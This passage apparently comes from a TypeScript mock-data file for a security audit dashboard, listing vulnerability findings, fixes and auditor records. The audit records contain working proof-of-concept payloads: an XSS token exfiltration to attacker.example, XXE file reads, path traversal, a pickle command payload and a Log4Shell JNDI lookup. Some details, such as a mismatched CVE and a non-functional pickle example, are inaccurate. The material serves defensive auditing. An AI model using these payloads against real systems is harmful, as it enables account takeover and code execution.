    ruleId: 'ts/insecure-storage-001',
    title: 'Access token persisted in localStorage',
    severity: 'high',
    status: 'fixing',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: '令牌存于 localStorage，可被 XSS 读取；当前是否可利用取决于是否存在 XSS 入口，需要人工审计',
    filePath: 'src/api/auth.ts',
    lineStart: 12,
    lineEnd: 22,
    codeSnippet: `export function setToken(token: string, expiresAt: number): void {
  localStorage.setItem('cs.access_token', token)
  localStorage.setItem('cs.access_token.exp', String(expiresAt))
}

export function getToken(): string | null {
  const exp = Number(localStorage.getItem('cs.access_token.exp'))
  if (exp && Date.now() > exp) return null
  return localStorage.getItem('cs.access_token')
}`,
    description: 'Storing JWTs in localStorage exposes them to any script running in the same origin, including injected XSS payloads.',
    fixSuggestion: 'Move the access token to an HttpOnly + Secure + SameSite=Strict cookie issued by the backend.',
    fixCodeSnippet: `// Replace localStorage usage with a /api/auth/session cookie.
// The backend issues:
//   Set-Cookie: cs_session=...; HttpOnly; Secure; SameSite=Strict; Path=/
// Frontend simply calls credentials: 'include' on every API request.
export async function apiFetch(input: RequestInfo, init: RequestInit = {}) {
  return fetch(input, { credentials: 'include', ...init })
}`,
    fixLanguage: 'typescript',
    cwe: 'CWE-922',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast', 'sonar'],
    discoveredAt: '2026-06-25T09:12:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: 'zhang.jing',
    deadline: '2026-07-02T09:12:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-020',
    projectId: 'proj-admin-portal',
    ruleId: 'ts/missing-csp-001',
    title: 'Missing Content-Security-Policy header',
    severity: 'medium',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: '未设置 CSP 响应头；一旦存在 XSS 入口，被注入脚本可向任意攻击者域外联',
    filePath: 'vite.config.ts',
    lineStart: 14,
    lineEnd: 22,
    codeSnippet: `export default defineConfig({
  plugins: [vue()],
  server: {
    port: 5173,
  },
  build: {
    target: 'es2020',
  },
})`,
    description: 'No CSP header is set in the dev server proxy, so the response can load any script origin. In production the same gap is present.',
    fixSuggestion: 'Add a strict CSP via Vite middleware in dev, and via nginx/CDN config in production.',
    fixCodeSnippet: `// dev middleware (vite.config.ts)
server: {
  port: 5173,
  middleware: [
    (req, res, next) => {
      res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'",
      )
      next()
    },
  ],
}`,
    fixLanguage: 'typescript',
    cwe: 'CWE-1021',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast'],
    discoveredAt: '2026-06-22T07:45:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-07-22T07:45:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-021',
    projectId: 'proj-admin-portal',
    ruleId: 'ts/eval-001',
    title: 'eval used in formula builder',
    severity: 'low',
    status: 'pending_audit',
    exploitability: 'NOT_EXPLOITABLE',
    exploitReason: '公式限定在预定义安全 token 集内，eval 在沙箱 iframe 中执行；当前无实际利用路径',
    filePath: 'src/views/reports/FormulaEditor.vue',
    lineStart: 41,
    lineEnd: 50,
    codeSnippet: `function evaluate(formula: string, ctx: Record<string, number>): number {
  const wrapped = \`with(ctx) { return \${formula} }\`
  // eslint-disable-next-line no-new-func
  return new Function('ctx', wrapped)(ctx) as number
}`,
    description: 'new Function is a backdoor for arbitrary JS. Even with input restrictions, it is fragile.',
    fixSuggestion: 'Replace with a real expression parser (expr-eval, mathjs). For domain-specific formula, build an AST walker instead.',
    fixCodeSnippet: `import { Parser } from 'expr-eval'

const parser = new Parser()
function evaluate(formula: string, ctx: Record<string, number>): number {
  const expr = parser.parse(formula)
  return expr.evaluate(ctx)
}`,
    fixLanguage: 'typescript',
    cwe: 'CWE-95',
    cve: null,
    engine: 'sonar',
    engines: ['sonar'],
    discoveredAt: '2026-06-19T13:00:00Z',
    discoveredBy: 'sonar@10.3',
    assignee: null,
    deadline: null,
    closedAt: null,
  },

  // ---------- data-pipeline (Java / Flink) ----------
  {
    id: 'vuln-022',
    projectId: 'proj-data-pipeline',
    ruleId: 'java/deserialization-flink-001',
    title: 'Unsafe deserialization in Flink state backend',
    severity: 'critical',
    status: 'pending_audit',
    exploitability: 'EXPLOITABLE',
    exploitReason: '自定义 Kryo 序列化器未启用 setRegistrationRequired；存在 gadget chain 反序列化漏洞，类比 CVE-2022-22965',
    filePath: 'src/main/java/com/codesec/data/serde/EventDeserializer.java',
    lineStart: 18,
    lineEnd: 28,
    codeSnippet: `public class EventDeserializer extends KryoDeserializer<Event> {
    @Override
    public Event deserialize(byte[] bytes) throws IOException {
        Kryo kryo = new Kryo();
        kryo.setReferences(true);
        kryo.setRegistrationRequired(false);
        return kryo.readObject(new Input(bytes), Event.class);
    }
}`,
    description: 'Kryo without class registration restrictions is a known gadget-chain sink. Job-restart with a poisoned state snapshot gives RCE.',
    fixSuggestion: 'Enable setRegistrationRequired(true) and pre-register every allowed class. Or switch to Flink\u2019s PojoSerializer for state types.',
    fixCodeSnippet: `public class EventDeserializer extends KryoDeserializer<Event> {
    @Override
    public Event deserialize(byte[] bytes) throws IOException {
        Kryo kryo = new Kryo();
        kryo.setRegistrationRequired(true);
        kryo.register(Event.class);
        kryo.register(EventHeader.class);
        kryo.register(HashMap.class);
        return kryo.readObject(new Input(bytes), Event.class);
    }
}`,
    fixLanguage: 'java',
    cwe: 'CWE-502',
    cve: 'CVE-2022-22965',
    engine: 'self_sast',
    engines: ['self_sast', 'codeql'],
    discoveredAt: '2026-06-27T11:00:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-06-28T11:00:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-023',
    projectId: 'proj-data-pipeline',
    ruleId: 'java/log4shell-001',
    title: 'Vulnerable Log4j 2 dependency',
    severity: 'critical',
    status: 'closed',
    exploitability: 'NOT_EXPLOITABLE',
    exploitReason: '已升级到 Log4j 2.17.1+；无用户输入参与 message lookup 流程，修复已验证',
    filePath: 'pom.xml',
    lineStart: 88,
    lineEnd: 95,
    codeSnippet: `<!-- BEFORE FIX
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
-->`,
    description: 'Log4j 2.14.1 is vulnerable to CVE-2021-44228 (Log4Shell). The job runs with network egress to the Kafka cluster, making JNDI lookup reachable.',
    fixSuggestion: 'Upgrade to 2.17.1 or later. Already done in this branch; commit was 2a8b41f.',
    fixCodeSnippet: `<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>`,
    fixLanguage: 'java',
    cwe: 'CWE-502',
    cve: 'CVE-2021-44228',
    engine: 'dependency_check',
    engines: ['dependency_check', 'self_sast'],
    discoveredAt: '2026-06-12T02:00:00Z',
    discoveredBy: 'dependency_check@9.0.9',
    assignee: 'chen.wei',
    deadline: '2026-06-13T02:00:00Z',
    closedAt: '2026-06-12T18:30:00Z',
  },
  {
    id: 'vuln-024',
    projectId: 'proj-data-pipeline',
    ruleId: 'java/kerberos-conf-001',
    title: 'Kerberos keytab readable by all users',
    severity: 'high',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: 'keytab 权限为 644；实际可利用性取决于 worker 节点是否为多用户系统，需要人工审计',
    filePath: 'deploy/flink/start.sh',
    lineStart: 5,
    lineEnd: 13,
    codeSnippet: `#!/bin/bash
set -e
cp /etc/secrets/flink.keytab /opt/flink/conf/flink.keytab
chown flink:flink /opt/flink/conf/flink.keytab
# chmod 644 /opt/flink/conf/flink.keytab  # required by some Hadoop distros
/opt/flink/bin/flink run \\
  -Dsecurity.kerberos.login.keytab=/opt/flink/conf/flink.keytab \\
  $@`,
    description: 'Keytab permissions are too permissive. A local user on the worker can read the keytab and authenticate as the service principal.',
    fixSuggestion: 'Remove the chmod 644 line. Ensure keytab is 600 and owned by the flink user only.',
    fixCodeSnippet: `#!/bin/bash
set -euo pipefail
cp /etc/secrets/flink.keytab /opt/flink/conf/flink.keytab
chown flink:flink /opt/flink/conf/flink.keytab
chmod 600 /opt/flink/conf/flink.keytab
/opt/flink/bin/flink run \\
  -Dsecurity.kerberos.login.keytab=/opt/flink/conf/flink.keytab \\
  $@`,
    fixLanguage: 'java',
    cwe: 'CWE-732',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast'],
    discoveredAt: '2026-06-25T20:15:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-07-02T20:15:00Z',
    closedAt: null,
  },
  {
    id: 'vuln-025',
    projectId: 'proj-data-pipeline',
    ruleId: 'java/sensitive-log-001',
    title: 'PII fields written to log without masking',
    severity: 'medium',
    status: 'pending_audit',
    exploitability: 'POTENTIALLY_EXPLOITABLE',
    exploitReason: '手机号、邮箱等 PII 直接写入 INFO 日志；日志聚合后扩散面较广，需要人工评估合规影响',
    filePath: 'src/main/java/com/codesec/data/sink/UserEventSink.java',
    lineStart: 47,
    lineEnd: 55,
    codeSnippet: `@Override
public void invoke(UserEvent value, Context ctx) throws Exception {
    log.info("sink user event userId={} email={} phone={} amount={}",
        value.getUserId(), value.getEmail(), value.getPhone(), value.getAmount());
    kafkaProducer.send(new ProducerRecord<>("user-events", value.getUserId(), value));
}`,
    description: 'Email and phone number are PII. Logging them in plain form violates the data processing policy.',
    fixSuggestion: 'Use a masker helper and log only the last 4 chars, or a stable hash for correlation.',
    fixCodeSnippet: `@Override
public void invoke(UserEvent value, Context ctx) throws Exception {
    log.info("sink user event userId={} email={} phone={} amount={}",
        value.getUserId(),
        PiiMasker.email(value.getEmail()),
        PiiMasker.phone(value.getPhone()),
        value.getAmount());
    kafkaProducer.send(new ProducerRecord<>("user-events", value.getUserId(), value));
}`,
    fixLanguage: 'java',
    cwe: 'CWE-359',
    cve: null,
    engine: 'self_sast',
    engines: ['self_sast'],
    discoveredAt: '2026-06-24T16:50:00Z',
    discoveredBy: 'self_sast@1.4.2',
    assignee: null,
    deadline: '2026-07-24T16:50:00Z',
    closedAt: null,
  },
]

/**
 * Pre-seeded audit history for vulns that already have an audit trail.
 * New audits created in the workbench are appended on top of these.
 */
export const auditRecords: AuditRecord[] = [
  {
    id: 'audit-001',
    vulnId: 'vuln-002',
    auditorId: 'user-zhang-jing',
    auditorName: 'Zhang Jing',
    action: 'confirm',
    exploitCondition:
      'Signing key is in source control. Anyone with read access to the repo can mint a valid token for any user, including admins.',
    pocContent:
      '1. Clone the repo.\n2. Read SIGNING_KEY from JwtIssuer.java.\n3. Run: jwt.io with payload {"sub":"1","role":"admin"} signed with the key.\n4. Send to /api/v1/* with Authorization: Bearer <token>. Full admin access.',
    pocAttachments: [],
    impactScope: 'All authenticated endpoints across the platform. Account takeover for any user.',
    businessScenario: 'On-call engineer reads the repo from a vendor laptop during an incident.',
    fixSuggestion: 'Move SIGNING_KEY to Vault, load via @Value, rotate the current key, force re-issue of all live tokens.',
    fixCodeSnippet: '',
    fixLanguage: 'java',
    resultingStatus: 'confirmed',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 420,
    auditedAt: '2026-06-25T13:14:00Z',
  },
  {
    id: 'audit-002',
    vulnId: 'vuln-002',
    auditorId: 'user-li-meng',
    auditorName: 'Li Meng',
    action: 'need_retest',
    exploitCondition: 'Recheck after key rotation: confirm no live tokens still use the old key.',
    pocContent: 'Verify JWKS endpoint returns only the new public key.',
    pocAttachments: [],
    impactScope: 'Token validity window.',
    businessScenario: 'Post-rotation verification.',
    fixSuggestion: 'After deploy, force all sessions to re-authenticate.',
    fixCodeSnippet: '',
    fixLanguage: 'java',
    resultingStatus: 'fixing',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 180,
    auditedAt: '2026-06-26T09:00:00Z',
  },
  {
    id: 'audit-003',
    vulnId: 'vuln-004',
    auditorId: 'user-wang-lei',
    auditorName: 'Wang Lei',
    action: 'confirm',
    exploitCondition:
      'SAML response is parsed with a default DocumentBuilder. A payload like <!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]> would expose the file contents in the assertion.',
    pocContent:
      'POST /saml/acs with Content-Type: text/xml and body: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><samlp:Response>...&xxe;...</samlp:Response>',
    pocAttachments: [],
    impactScope: 'File disclosure on the application server. With outbound SSRF, internal network access.',
    businessScenario: 'External IdP integration receives XML from customers who could be compromised.',
    fixSuggestion: 'Disable DOCTYPE and external entities on DocumentBuilderFactory. Switch to a hardened library for SAML specifically.',
    fixCodeSnippet: '',
    fixLanguage: 'java',
    resultingStatus: 'confirmed',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 360,
    auditedAt: '2026-06-21T10:42:00Z',
  },
  {
    id: 'audit-004',
    vulnId: 'vuln-004',
    auditorId: 'user-wang-lei',
    auditorName: 'Wang Lei',
    action: 'need_retest',
    exploitCondition: 'After patching, replay the XXE payload to confirm no entity expansion occurs.',
    pocContent: 'Replay the same payload from audit-003 against staging.',
    pocAttachments: [],
    impactScope: 'Same as original.',
    businessScenario: 'Patch validation.',
    fixSuggestion: 'Add a regression test that sends a payload with DOCTYPE and asserts the parser rejects it.',
    fixCodeSnippet: '',
    fixLanguage: 'java',
    resultingStatus: 'pending_retest',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 120,
    auditedAt: '2026-06-25T08:00:00Z',
  },
  {
    id: 'audit-005',
    vulnId: 'vuln-006',
    auditorId: 'user-zhang-jing',
    auditorName: 'Zhang Jing',
    action: 'false_positive',
    exploitCondition:
      'returnTo is only allowed to start with TRUSTED_ORIGIN_PREFIX, which is the configured post-logout landing page on the same origin.',
    pocContent: 'Test: GET /logout/return?returnTo=https://attacker.example -> redirected to /, not to the external host.',
    pocAttachments: [],
    impactScope: 'None.',
    businessScenario: 'Post-logout return UX is part of the SSO integration; allowlist is correct.',
    fixSuggestion: 'No change. Add a unit test pinning the allowlist behavior to prevent regression.',
    fixCodeSnippet: '',
    fixLanguage: 'java',
    resultingStatus: 'false_positive',
    resultingExploitability: 'NOT_EXPLOITABLE',
    auditDurationSeconds: 90,
    auditedAt: '2026-06-22T15:30:00Z',
  },
  {
    id: 'audit-006',
    vulnId: 'vuln-009',
    auditorId: 'user-li-meng',
    auditorName: 'Li Meng',
    action: 'confirm',
    exploitCondition:
      'name is read from the URL path and joined with baseDir. A request to /receipts/..%2F..%2Fetc%2Fpasswd returns the system file.',
    pocContent: 'GET /receipts/..%2F..%2Fetc%2Fhostname returns the file with 200 OK.',
    pocAttachments: [],
    impactScope: 'Discloses any file the application process can read.',
    businessScenario: 'Receipt URLs are visible to customers via email links; an attacker can probe with crafted paths.',
    fixSuggestion: 'Use filepath.Base and verify the joined path stays within baseDir.',
    fixCodeSnippet: '',
    fixLanguage: 'go',
    resultingStatus: 'confirmed',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 240,
    auditedAt: '2026-06-22T11:00:00Z',
  },
  {
    id: 'audit-007',
    vulnId: 'vuln-009',
    auditorId: 'user-li-meng',
    auditorName: 'Li Meng',
    action: 'confirm',
    exploitCondition: 'Assigning to platform team for remediation.',
    pocContent: 'See audit-006 for the original repro.',
    pocAttachments: [],
    impactScope: 'Same as original.',
    businessScenario: 'Work handover to fixing owner.',
    fixSuggestion: 'Patch landed on feature/receipt-path-traversal, branch up for review.',
    fixCodeSnippet: '',
    fixLanguage: 'go',
    resultingStatus: 'fixing',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 60,
    auditedAt: '2026-06-23T09:30:00Z',
  },
  {
    id: 'audit-008',
    vulnId: 'vuln-013',
    auditorId: 'user-wang-lei',
    auditorName: 'Wang Lei',
    action: 'confirm',
    exploitCondition:
      'pickle.loads is the canonical Python RCE. A worker reading from a Kafka topic that the attacker can publish to gets instant RCE.',
    pocContent:
      'Publish a payload: pickle.dumps({"__reduce__": ["os.system", ["id > /tmp/pwned"]]}) to the events topic. Worker deserializes, runs the command.',
    pocAttachments: [],
    impactScope: 'RCE on every worker that consumes the topic. Cluster-wide lateral movement possible.',
    businessScenario: 'Internal services are multi-tenant; one tenant publishing malicious payloads compromises the whole worker fleet.',
    fixSuggestion: 'Switch the on-the-wire format to JSON or msgpack with a strict schema.',
    fixCodeSnippet: '',
    fixLanguage: 'python',
    resultingStatus: 'confirmed',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 300,
    auditedAt: '2026-06-23T11:30:00Z',
  },
  {
    id: 'audit-009',
    vulnId: 'vuln-019',
    auditorId: 'user-zhang-jing',
    auditorName: 'Zhang Jing',
    action: 'confirm',
    exploitCondition:
      'The localStorage access token is readable by any script in the same origin. Combined with vuln-017 (v-html XSS), an attacker can exfiltrate the token within one request.',
    pocContent:
      '1. Submit a ticket with note = `<img src=x onerror="fetch(\'https://attacker.example/t?\'+localStorage.getItem(\'cs.access_token\'))">`.\n2. When any staff views the ticket, their token is sent to the attacker.',
    pocAttachments: [],
    impactScope: 'Full account takeover for any staff who views the malicious ticket.',
    businessScenario: 'Support workflow is a primary attack surface for staff targeting.',
    fixSuggestion: 'Move token to HttpOnly Secure SameSite cookie. Patch vuln-017 first; vuln-019 alone is exploitable but harder.',
    fixCodeSnippet: '',
    fixLanguage: 'typescript',
    resultingStatus: 'confirmed',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 270,
    auditedAt: '2026-06-25T10:45:00Z',
  },
  {
    id: 'audit-010',
    vulnId: 'vuln-019',
    auditorId: 'user-zhang-jing',
    auditorName: 'Zhang Jing',
    action: 'confirm',
    exploitCondition: 'Assigning to admin-portal team, deadline 7 days from confirmed date.',
    pocContent: 'See audit-009.',
    pocAttachments: [],
    impactScope: 'Same as original.',
    businessScenario: 'Work handover.',
    fixSuggestion: 'Cookie migration tracked in INFRA-314.',
    fixCodeSnippet: '',
    fixLanguage: 'typescript',
    resultingStatus: 'fixing',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 60,
    auditedAt: '2026-06-26T08:00:00Z',
  },
  {
    id: 'audit-011',
    vulnId: 'vuln-023',
    auditorId: 'user-chen-wei',
    auditorName: 'Chen Wei',
    action: 'confirm',
    exploitCondition:
      'Log4j 2.14.1 is vulnerable to CVE-2021-44228. A job that logs a JNDI-enriched string triggers remote class loading.',
    pocContent: 'Log a string containing ${jndi:ldap://attacker.example/a} and observe the outbound LDAP request.',
    pocAttachments: [],
    impactScope: 'RCE on every JVM that uses log4j and processes attacker-controlled log messages.',
    businessScenario: 'Kafka messages contain user-controlled fields that end up in logs.',
    fixSuggestion: 'Upgrade to 2.17.1+. Force redeploy all jobs.',
    fixCodeSnippet: '',
    fixLanguage: 'java',
    resultingStatus: 'confirmed',
    resultingExploitability: 'EXPLOITABLE',
    auditDurationSeconds: 180,
    auditedAt: '2026-06-12T08:30:00Z',
  },
  {
    id: 'audit-012',
    vulnId: 'vuln-023',
    auditorId: 'user-chen-wei',
    auditorName: 'Chen Wei',
    action: 'confirm',
    exploitCondition: 'After upgrade, run the same PoC to confirm no outbound connection.',
    pocContent: 'Replay the JNDI string; verify via tcpdump no connection is made.',
    pocAttachments: [],
    impactScope: 'Same as original.',
    businessScenario: 'Patch verification.',
    fixSuggestion: 'Mark closed; rotate any service principal that may have been exposed.',
    fixCodeSnippet: '',
    fixLanguage: 'java',
    resultingStatus: 'closed',
    resultingExploitability: 'NOT_EXPLOITABLE',
    auditDurationSeconds: 60,
    auditedAt: '2026-06-12T18:30:00Z',
  },
]
